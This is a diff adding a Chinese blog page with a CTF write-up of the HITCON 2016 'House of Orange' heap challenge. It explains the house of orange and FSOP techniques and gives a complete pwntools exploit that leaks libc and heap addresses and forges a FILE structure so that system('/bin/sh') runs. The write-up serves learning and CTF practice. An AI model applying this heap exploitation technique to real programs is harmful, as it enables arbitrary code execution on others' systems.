@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="学习给自己的">
+    <meta name="description" content="一道FSOP例题">
+    <meta name="author" content="LOLOLO">
+    
+    <title>
+        
+            FSOP经典例题 |
+        
+        桥下少年
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"lololo-pwn.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/1.jpg","favicon":"/images/1.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"不要留恋过去,空想未来,专注当下。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                桥下少年
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">FSOP经典例题</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">LOLOLO</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-11-06 16:27:51</span>
+        <span class="mobile">2021-11-06 16:27</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/BUU/">BUU</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>5 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>保护全开</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用知识"><a href="#利用知识" class="headerlink" title="利用知识"></a>利用知识</h2><p>这题正如其名，需要用到house of orange的手法，同时还需要用到FSOP的方法</p>
+<p>先简单介绍一下house of orange 具体可以参考<a class="link" target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">wiki<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。  这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入  unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
+</blockquote>
+<h2 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h2><p>​    <img src="/2021/11/06/houseoforange-hitcon-2016/frist.png" alt="first"></p>
+<p>如上图所示，每个IO函数都拥有着该结构。</p>
+<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>
+<p><strong>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下：32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8；这里的偏移如下图所示</p>
+<p><img src="/2021/11/06/houseoforange-hitcon-2016/2.png" alt="2"></p>
+<p>图中标识的距离就是0xd8，其中后者就vatable的地址</p>
+<h2 id="IO-jump-t-指针"><a href="#IO-jump-t-指针" class="headerlink" title="IO_jump_t 指针"></a>IO_jump_t 指针</h2><p>而vtable 是 IO_jump_t 类型的指针，在IO_jump_t 中保存了一些函数指针，如下图</p>
+<p><img src="/2021/11/06/houseoforange-hitcon-2016/3.png" alt="3"></p>
+<p>在程序中则为第二章图片中第二条红线的内容</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><ol>
+<li>程序在每个创建的时候申请了三个堆块，第一个是结构体用来存放后两个堆块的地址，第二个用来存放name的内容，第三个用来price和color的数字；</li>
+<li>程序的see功能输出，orange的color和price；基本上没什么问题用来做泄露</li>
+<li>在upgrade中，存在堆溢出；在对已经存在的orange内容更新时，没有使用第一次输入的length，而是重新输入，最多为0x1000。</li>
+</ol>
+<h2 id="大概思路"><a href="#大概思路" class="headerlink" title="大概思路"></a>大概思路</h2><ol>
+<li>首先通过堆溢出，改掉top chunk的大小，然后再申请一个0x1000的堆块将top chunk申请出来，然后再申请一个0x400的堆块，它会保留main_arena的，通过这样可以泄露libc的地址；再通过upgrade，将main_arena覆盖掉，这一可以读出heap的地址，从而获得heap的基地址。</li>
+<li>然后我们对剩下的unsorted bin进行编辑，将它的size改为0x60，并且在其中伪造_IO_FILE_plus和unsorted bin attack；我们将利用unsorted bin attack将 _IO_list_all的内容改为main_arena+0x58</li>
+<li>然后再次malloc，这时因为unsorted大小只有0x60，没办法满足要求，所以会被放入small bin里面，同时unsorted bin attack起作用，会将bk上面的_IO_list_all内容写成main_arena+0x58；此时会对一个非法地址进行malloc，此时会触发错误<br>此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体。</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,29277)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/lol/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">offset = libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">length,name,price</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">length,name,price</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>,<span class="number">32</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x22</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x0f41</span>)</span><br><span class="line"><span class="comment">#print (hex(len(payload)))</span></span><br><span class="line">upgrade(<span class="built_in">len</span>(payload),payload,<span class="number">0xa0</span>)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">100</span>,<span class="number">88</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;\x78&#x27;</span>,<span class="number">88</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">88</span>-offset-<span class="number">0x600</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">one_gadget=base +one_gadget[<span class="number">0</span>]</span><br><span class="line">io_list_all = base +libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vtable = base+libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xd8</span></span><br><span class="line"><span class="comment">#print (hex(vtable))</span></span><br><span class="line"><span class="comment">#print (hex(io_list_all))</span></span><br><span class="line">payload1 =<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x78&#x27;</span></span><br><span class="line">upgrade(<span class="number">0x11</span>,payload1,<span class="number">88</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span></span><br><span class="line">heap_base = heap-<span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(heap_base))</span><br><span class="line">payload2 =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0x58</span>)+p32(<span class="number">0x22</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file +=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x630</span>) </span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(sys)</span><br><span class="line">payload2 += fake_file</span><br><span class="line">upgrade(<span class="built_in">len</span>(payload2), payload2, <span class="number">88</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：FSOP经典例题</li>
+        <li>本文作者：LOLOLO</li>
+        <li>创建时间：2021-11-06 16:27:51</li>
+        <li>
+            本文链接：https://lololo-pwn.github.io/2021/11/06/houseoforange-hitcon-2016/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/BUU/">#BUU</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9-pwn1/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">陇原战役 PWN</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/02/ciscn-s-1/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CISCN_S_1</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">LOLOLO</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">利用知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FILE%E7%BB%93%E6%9E%84"><span class="nav-number">2.</span> <span class="nav-text">FILE结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-jump-t-%E6%8C%87%E9%92%88"><span class="nav-number">3.</span> <span class="nav-text">IO_jump_t 指针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E6%A6%82%E6%80%9D%E8%B7%AF"><span class="nav-number">5.</span> <span class="nav-text">大概思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">5.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
